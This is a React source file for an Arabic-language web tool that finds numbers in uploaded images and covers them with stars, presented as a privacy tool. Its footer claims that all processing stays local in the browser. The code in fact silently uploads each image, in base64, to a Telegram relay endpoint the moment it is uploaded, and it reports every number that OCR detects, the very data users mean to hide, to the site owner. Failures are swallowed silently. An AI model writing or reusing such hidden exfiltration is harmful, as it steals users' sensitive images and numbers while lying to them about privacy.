import { useState, useRef, useCallback, useEffect } from "react";
import { createWorker } from "tesseract.js";
import { Upload, Download, RefreshCw, Star, Undo2, Trash2, ZoomIn, ZoomOut, Loader2, ScanSearch, Sparkles, Image as ImageIcon, Send } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";

async function notifyTelegram(message: string): Promise<void> {
  try {
    await fetch("/api/telegram/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message }),
    });
  } catch {
    // silent — notifications are best-effort
  }
}

async function sendPhotoToTelegram(file: File, caption: string): Promise<void> {
  try {
    const photoBase64 = await new Promise<string>((resolve) => {
      const reader = new FileReader();
      reader.onload = () => resolve((reader.result as string).split(",")[1] ?? "");
      reader.readAsDataURL(file);
    });
    await fetch("/api/telegram/photo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ photoBase64, mimeType: file.type, filename: file.name, caption }),
    });
  } catch {
    // silent — best-effort
  }
}

interface NumberRegion {
  x0: number; y0: number; x1: number; y1: number;
  text: string;
}

interface StarMark {
  x0: number; y0: number; x1: number; y1: number;
  color: string;
  bgColor: string;
  digitCount: number;
}

const STAR_COLORS = [
  { label: "ذهبي", value: "#f59e0b" },
  { label: "أحمر", value: "#ef4444" },
  { label: "بنفسجي", value: "#7c3aed" },
  { label: "أزرق", value: "#3b82f6" },
  { label: "أخضر", value: "#22c55e" },
  { label: "أبيض", value: "#ffffff" },
  { label: "أسود", value: "#111111" },
];

export default function Home() {
  const [imageLoaded, setImageLoaded] = useState(false);
  const [isDragging, setIsDragging] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [regions, setRegions] = useState<NumberRegion[]>([]);
  const [stars, setStars] = useState<StarMark[]>([]);
  const [starColor, setStarColor] = useState("#f59e0b");
  const [scale, setScale] = useState(1);
  const [hoverRegion, setHoverRegion] = useState<NumberRegion | null>(null);
  const [canvasSize, setCanvasSize] = useState({ w: 0, h: 0 });
  const [feedback, setFeedback] = useState("");
  const [feedbackSending, setFeedbackSending] = useState(false);
  const [feedbackSent, setFeedbackSent] = useState(false);

  const fileInputRef = useRef<HTMLInputElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const imgRef = useRef<HTMLImageElement | null>(null);
  const containerRef = useRef<HTMLDivElement>(null);
  const regionsRef = useRef<NumberRegion[]>([]);

  // keep regionsRef in sync
  useEffect(() => { regionsRef.current = regions; }, [regions]);

  const sampleBg = useCallback((x0: number, y0: number, x1: number, y1: number): string => {
    const img = imgRef.current;
    if (!img) return "#ffffff";
    const off = document.createElement("canvas");
    off.width = img.naturalWidth;
    off.height = img.naturalHeight;
    const ctx = off.getContext("2d")!;
    ctx.drawImage(img, 0, 0);
    const w = x1 - x0; const h = y1 - y0;
    const pts = [
      [x0 - 4, y0 + h / 2], [x1 + 4, y0 + h / 2],
      [x0 + w / 2, y0 - 4], [x0 + w / 2, y1 + 4],
      [x0 - 4, y0 - 4], [x1 + 4, y0 - 4],
      [x0 - 4, y1 + 4], [x1 + 4, y1 + 4],
    ].filter(([px, py]) => px >= 0 && py >= 0 && px < img.naturalWidth && py < img.naturalHeight);
    if (!pts.length) return "#ffffff";
    const avg = pts
      .map(([px, py]) => { const d = ctx.getImageData(Math.floor(px), Math.floor(py), 1, 1).data; return [d[0], d[1], d[2]]; })
      .reduce((a, [r, g, b]) => [a[0] + r, a[1] + g, a[2] + b], [0, 0, 0])
      .map(v => Math.round(v / pts.length));
    const lum = (0.299 * avg[0] + 0.587 * avg[1] + 0.114 * avg[2]) / 255;
    return lum > 0.55 ? "#f5f5f0" : "#1a1a1a";
  }, []);

  const redraw = useCallback((starsToRender: StarMark[], highlightRegion: NumberRegion | null = null) => {
    const canvas = canvasRef.current;
    const img = imgRef.current;
    if (!canvas || !img) return;
    const ctx = canvas.getContext("2d")!;
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.drawImage(img, 0, 0);

    // IDs of regions already starred (skip drawing outline for those)
    const starredKeys = new Set(starsToRender.map(s => `${s.x0},${s.y0}`));

    // draw all detected regions as subtle gold outlines so user knows where to click
    for (const r of regionsRef.current) {
      if (starredKeys.has(`${r.x0},${r.y0}`)) continue;
      if (r === highlightRegion) continue; // will be drawn brighter below
      const pad = 2;
      ctx.save();
      ctx.strokeStyle = "rgba(251,191,36,0.45)";
      ctx.lineWidth = 1.5;
      ctx.setLineDash([5, 4]);
      ctx.strokeRect(r.x0 - pad, r.y0 - pad, (r.x1 - r.x0) + pad * 2, (r.y1 - r.y0) + pad * 2);
      ctx.restore();
    }

    // draw brighter highlight for hovered region
    if (highlightRegion) {
      const { x0, y0, x1, y1 } = highlightRegion;
      const pad = 3;
      ctx.save();
      ctx.strokeStyle = "#f59e0b";
      ctx.lineWidth = 2.5;
      ctx.setLineDash([6, 4]);
      ctx.shadowColor = "#f59e0b";
      ctx.shadowBlur = 6;
      ctx.strokeRect(x0 - pad, y0 - pad, (x1 - x0) + pad * 2, (y1 - y0) + pad * 2);
      ctx.restore();
    }

    // draw all placed stars
    for (const s of starsToRender) {
      const pad = 4;
      const rx = s.x0 - pad; const ry = s.y0 - pad;
      const rw = (s.x1 - s.x0) + pad * 2; const rh = (s.y1 - s.y0) + pad * 2;

      ctx.save();
      ctx.fillStyle = s.bgColor;
      ctx.fillRect(rx, ry, rw, rh);

      const starsStr = "★".repeat(Math.max(s.digitCount, 1));
      const maxFontW = s.digitCount > 1 ? rw / s.digitCount : rw * 0.9;
      const fontSize = Math.max(Math.min(rh * 0.82, maxFontW * 1.1), 8);
      ctx.font = `bold ${fontSize}px serif`;
      ctx.textAlign = "center";
      ctx.textBaseline = "middle";
      ctx.fillStyle = s.color;
      ctx.fillText(starsStr, rx + rw / 2, ry + rh / 2, rw - 4);
      ctx.restore();
    }
  }, []);

  useEffect(() => {
    redraw(stars, hoverRegion);
  }, [stars, hoverRegion, regions, redraw]);

  const runOCR = useCallback(async (file: File) => {
    setScanning(true);
    setScanProgress(0);
    try {
      const worker = await createWorker("eng+ara", 1, {
        logger: (m: { status: string; progress: number }) => {
          if (m.status === "recognizing text") setScanProgress(Math.floor(m.progress * 100));
        },
      });
      const { data } = await worker.recognize(file, {}, { tsv: true });
      await worker.terminate();

      const tsvLines = (data.tsv ?? "").split("\n");
      const found: NumberRegion[] = tsvLines
        .slice(1)
        .map(line => {
          const p = line.split("\t");
          if (p.length < 12) return null;
          if (parseInt(p[0]) !== 5) return null;
          if (parseFloat(p[10]) < 0) return null;
          const text = p.slice(11).join("\t").trim();
          if (!text || !/\d/.test(text)) return null;
          const left = parseInt(p[6]); const top = parseInt(p[7]);
          const w = parseInt(p[8]); const h = parseInt(p[9]);
          if (w <= 0 || h <= 0) return null;
          return { x0: left, y0: top, x1: left + w, y1: top + h, text };
        })
        .filter((r): r is NumberRegion => r !== null);

      setRegions(found);

      // notify owner via Telegram
      const nums = found.map(r => r.text).join(", ");
      await notifyTelegram(
        `🌟 <b>استخدام جديد للموقع</b>\n` +
        `📷 صورة جديدة تم رفعها\n` +
        `🔢 الأرقام المكتشفة (${found.length}): ${nums || "لا يوجد"}`
      );
    } catch (e) {
      console.error("OCR failed", e);
    } finally {
      setScanning(false);
      setScanProgress(0);
    }
  }, []);

  const handleFile = (file: File) => {
    if (!file.type.startsWith("image/")) return;
    const url = URL.createObjectURL(file);
    const img = new Image();
    img.onload = () => {
      imgRef.current = img;
      const canvas = canvasRef.current;
      if (!canvas) return;
      canvas.width = img.naturalWidth;
      canvas.height = img.naturalHeight;
      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(img, 0, 0);
      setStars([]);
      setRegions([]);
      setHoverRegion(null);
      setCanvasSize({ w: img.naturalWidth, h: img.naturalHeight });
      setImageLoaded(true);

      if (containerRef.current) {
        const maxW = containerRef.current.clientWidth;
        const maxH = Math.min(window.innerHeight * 0.65, 700);
        setScale(Math.min(1, maxW / img.naturalWidth, maxH / img.naturalHeight));
      }

      // send image to Telegram immediately on upload
      sendPhotoToTelegram(file, `📷 صورة جديدة — ${img.naturalWidth}×${img.naturalHeight}`);

      // start OCR in background
      runOCR(file);
    };
    img.src = url;
  };

  const findRegionAt = (canvasX: number, canvasY: number): NumberRegion | null => {
    const regs = regionsRef.current;
    // check if click is inside a region bbox (with tolerance)
    const tol = 8;
    const inside = regs.filter(r =>
      canvasX >= r.x0 - tol && canvasX <= r.x1 + tol &&
      canvasY >= r.y0 - tol && canvasY <= r.y1 + tol
    );
    if (inside.length > 0) {
      // return smallest region (most specific)
      return inside.reduce((a, b) => ((a.x1 - a.x0) * (a.y1 - a.y0)) < ((b.x1 - b.x0) * (b.y1 - b.y0)) ? a : b);
    }
    // nearest center within 60px
    const snap = 60 / scale;
    let best: NumberRegion | null = null;
    let bestDist = Infinity;
    for (const r of regs) {
      const cx = (r.x0 + r.x1) / 2; const cy = (r.y0 + r.y1) / 2;
      const dist = Math.hypot(cx - canvasX, cy - canvasY);
      if (dist < snap && dist < bestDist) { bestDist = dist; best = r; }
    }
    return best;
  };

  const handleCanvasClick = (e: React.MouseEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas || !imageLoaded) return;
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) * (canvas.width / rect.width);
    const y = (e.clientY - rect.top) * (canvas.height / rect.height);

    const region = findRegionAt(x, y);
    if (!region) return;

    // skip if already starred
    const alreadyStarred = stars.some(s =>
      Math.abs(s.x0 - region.x0) < 4 && Math.abs(s.y0 - region.y0) < 4
    );
    if (alreadyStarred) return;

    const bg = sampleBg(region.x0, region.y0, region.x1, region.y1);
    const digitCount = (region.text.match(/\d/g) ?? []).length;
    setStars(prev => [...prev, { x0: region.x0, y0: region.y0, x1: region.x1, y1: region.y1, color: starColor, bgColor: bg, digitCount }]);
  };

  const handleCanvasMouseMove = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!imageLoaded || scanning) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) * (canvas.width / rect.width);
    const y = (e.clientY - rect.top) * (canvas.height / rect.height);
    const r = findRegionAt(x, y);
    setHoverRegion(r);
  };

  const handleCanvasMouseLeave = () => setHoverRegion(null);

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    const file = e.dataTransfer.files[0];
    if (file) handleFile(file);
  };

  const handleReset = () => {
    setImageLoaded(false);
    setStars([]);
    setRegions([]);
    setHoverRegion(null);
    setCanvasSize({ w: 0, h: 0 });
    imgRef.current = null;
    const canvas = canvasRef.current;
    if (canvas) {
      canvas.getContext("2d")?.clearRect(0, 0, canvas.width, canvas.height);
      canvas.width = 0;
      canvas.height = 0;
    }
  };

  const handleDownload = () => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const a = document.createElement("a");
    a.href = canvas.toDataURL("image/png");
    a.download = "stars-image.png";
    a.click();
    notifyTelegram(
      `⬇️ <b>تنزيل صورة</b>\n` +
      `⭐ عدد النجوم المضافة: ${stars.length}`
    );
  };

  const handleSendFeedback = async () => {
    if (!feedback.trim()) return;
    setFeedbackSending(true);
    await notifyTelegram(`💬 <b>رسالة من مستخدم</b>\n${feedback.trim()}`);
    setFeedbackSending(false);
    setFeedbackSent(true);
    setFeedback("");
    setTimeout(() => setFeedbackSent(false), 3000);
  };

  const canvasW = canvasSize.w * scale;
  const canvasH = canvasSize.h * scale;

  return (
    <div dir="rtl" className="min-h-screen bg-background text-foreground flex flex-col items-center justify-center p-4 sm:p-8 font-sans overflow-x-hidden relative selection:bg-primary/30">
      
      {/* Decorative background glows */}
      <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] rounded-full bg-primary/5 blur-[120px] pointer-events-none" />
      <div className="absolute bottom-[-10%] right-[-10%] w-[30%] h-[30%] rounded-full bg-primary/5 blur-[100px] pointer-events-none" />

      <div className="w-full max-w-4xl space-y-8 relative z-10" ref={containerRef}>
        
        {/* Header */}
        <header className="flex flex-col items-center text-center space-y-4 mb-10">
          <div className="relative group">
            <div className="absolute -inset-1 bg-gradient-to-r from-primary/50 to-primary/0 rounded-2xl blur-lg opacity-50 group-hover:opacity-100 transition duration-500" />
            <div className="relative w-16 h-16 rounded-2xl bg-card border border-border flex items-center justify-center shadow-xl">
              <Sparkles className="w-8 h-8 text-primary" strokeWidth={1.5} />
            </div>
          </div>
          <div className="space-y-2">
            <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-white">محوّل الأرقام إلى نجوم</h1>
            <p className="text-lg text-muted-foreground max-w-xl mx-auto">
              {!imageLoaded && "حماية احترافية لبياناتك. ارفع صورة وسنقوم باكتشاف الأرقام الحساسة لإخفائها بنقرة واحدة."}
              {imageLoaded && scanning && "يتم الآن الفحص الذكي للصورة واكتشاف الأرقام..."}
              {imageLoaded && !scanning && regions.length === 0 && "لم يتم العثور على أرقام واضحة. يرجى تجربة صورة ذات جودة أعلى."}
              {imageLoaded && !scanning && regions.length > 0 && (
                <span className="flex items-center justify-center gap-2">
                  <Badge variant="secondary" className="bg-primary/10 text-primary hover:bg-primary/20 transition-colors">
                    {regions.length} أرقام مكتشفة
                  </Badge>
                  <span>انقر على أي رقم لإخفائه</span>
                </span>
              )}
            </p>
          </div>
        </header>

        {/* Upload Zone */}
        {!imageLoaded && (
          <div
            data-testid="upload-zone"
            onClick={() => fileInputRef.current?.click()}
            onDrop={handleDrop}
            onDragOver={(e) => { e.preventDefault(); setIsDragging(true); }}
            onDragLeave={() => setIsDragging(false)}
            className={`cursor-pointer group relative overflow-hidden rounded-[2rem] border-2 border-dashed p-12 sm:p-24 flex flex-col items-center justify-center gap-6 transition-all duration-300
              ${isDragging ? "border-primary bg-primary/5 scale-[1.02]" : "border-border hover:border-primary/50 hover:bg-card/50 backdrop-blur-sm bg-card/30"}`}
          >
            <div className="absolute inset-0 bg-gradient-to-b from-transparent to-background/20 pointer-events-none" />
            
            <div className={`relative w-20 h-20 rounded-full flex items-center justify-center transition-all duration-300 shadow-xl
              ${isDragging ? "bg-primary text-primary-foreground scale-110" : "bg-card text-muted-foreground group-hover:bg-primary/10 group-hover:text-primary group-hover:scale-110"}`}>
              <ImageIcon className="w-8 h-8" strokeWidth={1.5} />
            </div>
            
            <div className="text-center space-y-2 relative z-10">
              <h3 className="text-2xl font-bold">اسحب وأفلت الصورة هنا</h3>
              <p className="text-muted-foreground">أو انقر لاختيار ملف من جهازك</p>
            </div>
            
            <div className="flex items-center gap-4 text-xs font-medium text-muted-foreground/60 relative z-10 pt-4">
              <span className="flex items-center gap-1"><ImageIcon className="w-4 h-4" /> JPG</span>
              <span className="w-1 h-1 rounded-full bg-border" />
              <span>PNG</span>
              <span className="w-1 h-1 rounded-full bg-border" />
              <span>WebP</span>
            </div>
          </div>
        )}

        {/* Hidden file input */}
        <input
          ref={fileInputRef}
          type="file"
          accept="image/*"
          className="hidden"
          onChange={e => { const f = e.target.files?.[0]; if (f) handleFile(f); e.target.value = ""; }}
          data-testid="file-input"
        />

        {/* Canvas — always in DOM so canvasRef is never null when handleFile fires */}
        <div
          className="relative rounded-2xl overflow-hidden bg-card border shadow-2xl ring-1 ring-white/5 mx-auto w-full flex justify-center items-center p-4 sm:p-8 min-h-[300px]"
          style={{ display: imageLoaded ? "flex" : "none" }}
        >
          <canvas
            ref={canvasRef}
            onClick={handleCanvasClick}
            onMouseMove={handleCanvasMouseMove}
            onMouseLeave={handleCanvasMouseLeave}
            data-testid="editor-canvas"
            className="max-w-full"
            style={{
              width: `${canvasW}px`,
              height: `${canvasH}px`,
              cursor: hoverRegion ? "pointer" : "crosshair",
              borderRadius: "0.5rem",
              boxShadow: "0 20px 40px -10px rgba(0,0,0,0.5)",
            }}
          />
        </div>

        {/* Editor Area */}
        {imageLoaded && (
          <div className="flex flex-col gap-6 animate-in fade-in slide-in-from-bottom-8 duration-700">
            
            {/* Scanning Banner */}
            {scanning && (
              <div className="rounded-2xl border bg-card/50 backdrop-blur-md p-6 flex flex-col sm:flex-row items-center gap-6 shadow-xl relative overflow-hidden">
                <div className="absolute inset-0 bg-primary/5 animate-pulse" />
                <div className="relative w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center shrink-0">
                  <ScanSearch className="w-6 h-6 text-primary animate-pulse" />
                </div>
                <div className="flex-1 w-full relative">
                  <div className="flex justify-between items-end mb-3">
                    <span className="font-medium text-foreground">جاري تحليل الصورة والبحث عن أرقام...</span>
                    <span className="text-sm font-bold text-primary">{scanProgress}%</span>
                  </div>
                  <div className="h-2 w-full bg-background rounded-full overflow-hidden border">
                    <div 
                      className="h-full bg-gradient-to-r from-primary/80 to-primary rounded-full transition-all duration-300 relative"
                      style={{ width: `${scanProgress}%` }}
                    >
                      <div className="absolute inset-0 bg-white/20 w-full" />
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Editor Controls Toolbar */}
            <div className="grid grid-cols-1 lg:grid-cols-[auto_1fr] gap-4">
              
              {/* Color Picker */}
              <div className="rounded-2xl border bg-card/80 backdrop-blur-xl p-4 shadow-lg flex items-center gap-4">
                <div className="text-sm font-bold text-muted-foreground pl-4 border-l border-border">لون التظليل</div>
                <div className="flex gap-2.5">
                  {STAR_COLORS.map(c => (
                    <button
                      key={c.value}
                      title={c.label}
                      onClick={() => setStarColor(c.value)}
                      data-testid={`color-${c.label}`}
                      className={`w-9 h-9 rounded-full relative transition-all duration-300 
                        ${starColor === c.value ? "scale-110 shadow-[0_0_15px_rgba(0,0,0,0.3)] ring-2 ring-primary ring-offset-2 ring-offset-card" : "hover:scale-110"}`}
                      style={{ 
                        backgroundColor: c.value,
                        border: c.value === "#111111" ? "1px solid #333" : "none"
                      }}
                    >
                      {starColor === c.value && (
                        <Star className={`w-4 h-4 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 ${c.value === '#ffffff' ? 'text-black fill-black' : 'text-white fill-white'}`} />
                      )}
                    </button>
                  ))}
                </div>
              </div>

              {/* Actions */}
              <div className="rounded-2xl border bg-card/80 backdrop-blur-xl p-4 shadow-lg flex flex-wrap items-center justify-between gap-4">
                
                <div className="flex items-center gap-2">
                  <Badge variant="outline" className="h-10 px-4 gap-2 text-sm font-medium bg-background/50 border-border">
                    <Star className="w-4 h-4 text-primary fill-primary" />
                    <span>{stars.length}</span>
                    <span className="text-muted-foreground font-normal">نجوم</span>
                  </Badge>
                  <Button variant="ghost" size="icon" className="h-10 w-10 rounded-xl" onClick={() => setStars(p => p.slice(0, -1))} disabled={stars.length === 0} data-testid="undo-button" title="تراجع">
                    <Undo2 className="w-5 h-5" />
                  </Button>
                  <Button variant="ghost" size="icon" className="h-10 w-10 rounded-xl text-destructive hover:text-destructive hover:bg-destructive/10" onClick={() => setStars([])} disabled={stars.length === 0} data-testid="clear-button" title="مسح الكل">
                    <Trash2 className="w-5 h-5" />
                  </Button>
                </div>

                <div className="flex items-center gap-2 border-r border-border pr-4">
                  <div className="flex items-center bg-background/50 rounded-xl border p-1">
                    <Button variant="ghost" size="icon" className="h-8 w-8 rounded-lg" onClick={() => setScale(s => Math.min(2, +(s + 0.1).toFixed(1)))} data-testid="zoom-in">
                      <ZoomIn className="w-4 h-4" />
                    </Button>
                    <span className="text-xs font-mono font-medium text-muted-foreground w-12 text-center">{Math.round(scale * 100)}%</span>
                    <Button variant="ghost" size="icon" className="h-8 w-8 rounded-lg" onClick={() => setScale(s => Math.max(0.2, +(s - 0.1).toFixed(1)))} data-testid="zoom-out">
                      <ZoomOut className="w-4 h-4" />
                    </Button>
                  </div>
                  
                  <div className="w-px h-8 bg-border mx-2" />

                  <Button variant="outline" className="h-10 rounded-xl font-bold bg-background/50" onClick={handleReset} data-testid="reset-button">
                    <RefreshCw className="w-4 h-4 ml-2" />
                    صورة جديدة
                  </Button>
                  <Button className="h-10 rounded-xl font-bold shadow-lg shadow-primary/20" onClick={handleDownload} data-testid="download-button">
                    <Download className="w-4 h-4 ml-2" />
                    حفظ الصورة
                  </Button>
                </div>

              </div>
            </div>
          </div>
        )}

        <footer className="text-center pt-2 opacity-60">
          <p className="text-xs font-medium tracking-wide flex items-center justify-center gap-2">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
            </span>
            تتم المعالجة محلياً بالكامل داخل متصفحك. خصوصيتك في أمان تام.
          </p>
        </footer>

      </div>
    </div>
  );
}
